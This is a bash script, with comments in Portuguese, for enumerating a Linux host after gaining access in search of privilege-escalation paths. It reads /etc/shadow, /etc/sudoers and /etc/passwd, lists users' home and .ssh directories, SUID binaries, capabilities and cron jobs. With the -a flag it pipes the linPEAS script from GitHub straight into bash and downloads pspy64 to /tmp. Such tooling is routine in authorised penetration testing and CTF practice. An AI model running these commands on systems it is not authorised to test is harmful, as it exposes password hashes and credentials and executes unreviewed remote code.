#!/bin/bash

linpeas="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
pspy64="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64"

echo ===============================
echo "    Basic Enumerate Linux    "
echo ===============================
echo
echo "System info:"
echo "-------------->"

echo
echo "id (usuario e grupos)"
echo "--------------------"
id
echo "--------------------"

echo
echo "who"
echo "--------------------"
who
echo "--------------------"

echo
echo "uname -a (sistema)"
echo "--------------------"
uname -a
echo "--------------------"

echo
echo "ls -la /home (homes de usuarios)"
echo "--------------------"
ls -la /home
echo "--------------------"
echo
echo "Listando homes..."
echo "--------------------"
for i in $(ls /home); do
echo "$i :"
echo "=========="
ls -la /home/$i;
done
echo "--------------------"

echo
echo "ps aux (auxilio)"
echo "--------------------"
ps aux
echo "--------------------"

echo
echo "cat /etc/sudoers"
echo "--------------------"
cat /etc/sudoers
echo "--------------------"

echo
echo "cat /etc/passwd"
echo "--------------------"
cat /etc/passwd
echo "--------------------"

echo
echo "Super usuarios"
echo "--------------------"
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
echo "--------------------"

echo
echo "sudo -l"
echo "--------------------"
sudo -l
echo "--------------------"

echo
echo "cat /etc/group"
echo "--------------------"
cat /etc/group
echo "--------------------"

echo
echo "cat /etc/shadow (arquivo com senhas linux) [perm]"
echo "--------------------"
cat /etc/shadow
echo "--------------------"

echo
echo "ls -alh /var/mail/ (mails system)"
echo "--------------------"
ls -alh /var/mail/
echo "--------------------"

echo
echo "crontab -l"
echo "--------------------"
crontab -l
echo "--------------------"

echo
echo "Cron services"
echo "--------------------"
ls -al /etc/ | grep cron
echo "--------------------"

echo
echo "ls -al /etc/cron*"
echo "--------------------"
ls -al /etc/cron*
echo "--------------------"

echo
echo "ls -la ~/.ssh/"
echo "--------------------"
ls -la ~/.ssh/
echo "--------------------"

echo
echo "find / -perm -u+x 2>/dev/null"
echo "--------------------"
find / -perm -u+s 2>/dev/null
echo "--------------------"

echo
echo "getcap -r / 2>/dev/null"
echo "--------------------"
getcap -r / 2>/dev/null
echo "--------------------"

if [ "$1" = "-a" ]; then

   echo
   echo "Iniciando módulos auxiliares:"
   echo "-------------->"

   echo
   echo "Load linpeas > /tmp/linpeas.txt"
   echo "--------------------"
   curl $linpeas -s | bash > /tmp/linpeas.txt &

   echo
   echo "Download pspy64 > /tmp/pspy64"
   echo "--------------------"
   curl $pspy64 -s -o /tmp/pspy64

fi
